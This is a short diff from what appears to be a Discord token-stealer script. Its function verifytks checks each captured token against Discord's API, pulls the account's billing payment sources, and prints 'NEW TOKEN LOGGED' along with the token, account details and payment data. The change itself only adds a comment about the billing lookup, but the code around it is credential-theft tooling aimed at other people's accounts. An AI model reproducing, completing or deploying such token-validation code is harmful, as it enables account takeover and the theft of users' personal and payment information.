@@ -47,7 +47,7 @@ def verifytks(token):
         }
 
         res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-        gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources')
+        gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources') #ts is scrapped because i didnt feel like making this
         
         if res.status_code == 200:
             print(f'NEW TOKEN LOGGED\n \n {token} \n info: \n{res.text}, {gift.text}')
